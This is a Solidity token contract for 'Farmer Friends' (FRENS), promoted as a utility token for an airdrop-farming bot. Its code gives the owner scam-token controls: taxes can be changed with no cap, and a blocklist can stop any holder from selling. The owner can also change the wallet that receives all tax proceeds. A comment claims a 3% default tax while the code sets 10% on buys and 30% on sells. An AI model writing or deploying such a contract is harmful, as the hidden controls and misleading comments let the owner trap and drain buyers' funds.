/**
Farmer Friends - An Automated Airdrop Farming tool for all.
Unlock your crypto fortune effortlessly with our automated airdrop bot – sit back and watch the rewards rain down!

Website: farmerfriends.app
Telegram: https://t.me/farmerfriendsportal
**/

// SPDX-License-Identifier: None
pragma solidity ^0.8.9;

// We're importing some fancy shit here, don't touch it
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

import "./interface/IUniswapRouter.sol";
import "./interface/IUniswapFactory.sol";

// Here's our token, Friend. It's utility token for Farmer Friends bot.
contract FarmerFriends is ERC20, Ownable, ReentrancyGuard {
    // We will use uniswap router to setup the pool here.
    address public uniswapV2Pair;
    address public immutable WETH;
    IUniswapRouter public immutable uniswapV2Router;

    // It is simple to enable the trading instead of just allow every tom, dick and harry to jump in right away. Its one way, can be enabled only once.
    bool public tradingEnabled = false;

    // We need to make sure that no one fucks or controls our token so we have enabled the maxWallet here.
    bool public maxWalletEnabled = true;
    uint256 public maxWalletPercentage = 50;

    // marketing address
    address public marketingWallet;

    // default 3% for buy and sell
    uint256 public buyTax = 1000;
    uint256 public sellTax = 3000;

    uint256 private minSwapAmt;

    // if routers dont hold more tokens than maxWallet, we are fucked.. lol
    mapping(address => bool) private _isExcludedWallet;

    // block user list
    mapping(address => bool) private _blockUsers;

    // Event to emit when the Uniswap pair is updated
    event UniswapPairUpdated(address pair);

    // some shit we will never really use it.
    event MaxWalletEnabledUpdated(bool value);
    event MaxWalletPercentageUpdated(uint256 value);
    event MarketingWalletUpdated(address marketing);
    event ExclusionFromMaxWalletUpdated(address account, bool value);
    event TradingEnabledUpdated(bool value);

    // This is where the token takes the birth to help the farmers. Get ready, we gonna just farm to valhalla.
    constructor(address _router, address _marketing) ERC20("Farmer Friends", "FRENS") {
        _mint(msg.sender, 100000000 * 10 ** 18); // 100 mill is good enough, may be not but we will figure out.

        marketingWallet = _marketing;

        // fucking around with uniswap router.
        uniswapV2Router = IUniswapRouter(_router);

        // create pair
        WETH = uniswapV2Router.WETH();
        uniswapV2Pair = IUniswapFactory(uniswapV2Router.factory()).createPair(
            WETH,
            address(this)
        );

        // we gonna allow these ladies to take the big wallet
        _isExcludedWallet[_router] = true;
        _isExcludedWallet[owner()] = true;
        _isExcludedWallet[address(this)] = true;
        _isExcludedWallet[uniswapV2Pair] = true;
    }

    modifier nonBlock() {
        require(!_blockUsers[msg.sender], "Blocked user");
        _;
    }

    // Making sure that we have a way to update the uniswap pair
    function updateUniswapPair(address pair) external onlyOwner {
        if (uniswapV2Pair != address(0))
            delete _isExcludedWallet[uniswapV2Pair];

        uniswapV2Pair = pair;
        _isExcludedWallet[uniswapV2Pair] = true;

        emit UniswapPairUpdated(pair);
    }

    // Well, at sometimes i am gonna be nice to allow people to hold as much as they want..
    function updateMarketingWallet(address marketing) external onlyOwner {
        marketingWallet = marketing;
        emit MarketingWalletUpdated(marketing);
    }

    // Well, at sometimes i am gonna be nice to allow people to hold as much as they want..
    function updateMaxWalletEnabled(bool value) external onlyOwner {
        maxWalletEnabled = value;
        emit MaxWalletEnabledUpdated(value);
    }

    // Sometimes its good to be decide and be like a king.
    function updateMaxWalletPercentage(
        uint256 newMaxWalletPercentage
    ) external onlyOwner {
        // Well even king also needs to in limits
        require(newMaxWalletPercentage <= 1e4, "Invalid percent");
        maxWalletPercentage = newMaxWalletPercentage;
        emit MaxWalletPercentageUpdated(newMaxWalletPercentage);
    }

    // May be we need to use it in case if we plan to have some partnerships. shhhhh..
    function setExclusionFromMaxWallet(
        address account,
        bool value
    ) external onlyOwner {
        _isExcludedWallet[account] = value;
        emit ExclusionFromMaxWalletUpdated(account, value);
    }

    // This is where it all starts, lets make some money...
    function enableTrading() external onlyOwner {
        tradingEnabled = true;
        emit TradingEnabledUpdated(true);
    }

    function setMinAmount(uint256 minAmt) external onlyOwner {
        minSwapAmt = minAmt;
    }

    function setTax(uint256 buy, uint256 sell) external onlyOwner {
        buyTax = buy;
        sellTax = sell;
    }

    function setBlockUser(
        address[] memory users,
        bool flag
    ) external onlyOwner {
        for (uint16 i; i < users.length; ++i) {
            if (flag) _blockUsers[users[i]] = true;
            else delete _blockUsers[users[i]];
        }
    }

    function isExcludedWallet(address account) external view returns (bool) {
        return _isExcludedWallet[account];
    }

    function isBlocked(address account) external view returns (bool) {
        return _blockUsers[account];
    }

    function _distributeReward() internal {
        uint256 tokenAmt = balanceOf(address(this));
        if (tokenAmt > minSwapAmt) {
            _approve(address(this), address(uniswapV2Router), tokenAmt);

            address[] memory paths = new address[](2);
            paths[0] = address(this);
            paths[1] = WETH;

            uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmt,
                0,
                paths,
                payable(marketingWallet),
                block.timestamp + 2 hours
            );
        }
    }

    // Need to make sure the tokens are transfered with rules set. Do not fuck it up here sers
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override nonBlock {
        require(
            !_blockUsers[recipient] && !_blockUsers[sender],
            "Blocked address"
        );

        // If trading isn't enabled, hold your horses..
        require(
            tradingEnabled || sender == owner() || recipient == owner(),
            "Trading is not enabled yet"
        );

        // wtf are you gonna do now.
        if (maxWalletEnabled && !_isExcludedWallet[recipient]) {
            require(
                balanceOf(recipient) + amount <=
                    (totalSupply() * maxWalletPercentage) / 1e4,
                "Exceeds max wallet limit"
            );
        }

        uint256 taxAmt = 0;
        if (uniswapV2Pair == sender) {
            // if user buys token
            unchecked {
                if (!_isExcludedWallet[recipient])
                    taxAmt = (amount * buyTax) / 1e4;
            }
        } else if (uniswapV2Pair == recipient) {
            // if user sells token
            unchecked {
                if (!_isExcludedWallet[sender])
                    taxAmt = (amount * sellTax) / 1e4;
            }
        } else {
            _distributeReward();
        }

        if (taxAmt != 0) {
            unchecked {
                super._transfer(sender, address(this), taxAmt);
                amount -= taxAmt;
            }
        }

        // if all good then just trust the smart contract -- lol --
        super._transfer(sender, recipient, amount);
    }
}